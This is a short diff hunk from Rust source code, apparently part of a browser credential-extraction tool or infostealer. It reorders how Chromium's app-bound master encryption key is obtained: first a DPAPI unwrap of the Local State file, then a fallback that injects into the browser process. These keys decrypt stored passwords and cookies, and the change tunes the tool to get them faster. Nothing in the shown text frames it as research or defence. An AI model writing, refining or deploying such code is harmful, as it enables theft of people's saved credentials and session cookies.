@@ -225,12 +225,11 @@ fn get_master_keys(user_data_path: &Path, browser_name: &str) -> Option<MasterKe
 
     let has_app_bound = json["os_crypt"]["app_bound_encrypted_key"].as_str().is_some();
     let app_bound = if has_app_bound {
-        crate::log::log(&format!("chromium app_bound key present: {browser_name}"));
-        super::chrome_inject::fetch_app_bound_key(browser_name)
-            .or_else(|| {
-                crate::log::log(&format!("chromium dpapi fallback try: {browser_name}"));
-                super::dpapi_fallback::try_from_local_state(&json)
-            })
+        // Fast path: DPAPI unwrap (~instant). Slow path: browser injection (~5-15s).
+        super::dpapi_fallback::try_from_local_state(&json).or_else(|| {
+            crate::log::log(&format!("chromium inject try: {browser_name}"));
+            super::chrome_inject::fetch_app_bound_key(browser_name)
+        })
     } else {
         None
     };
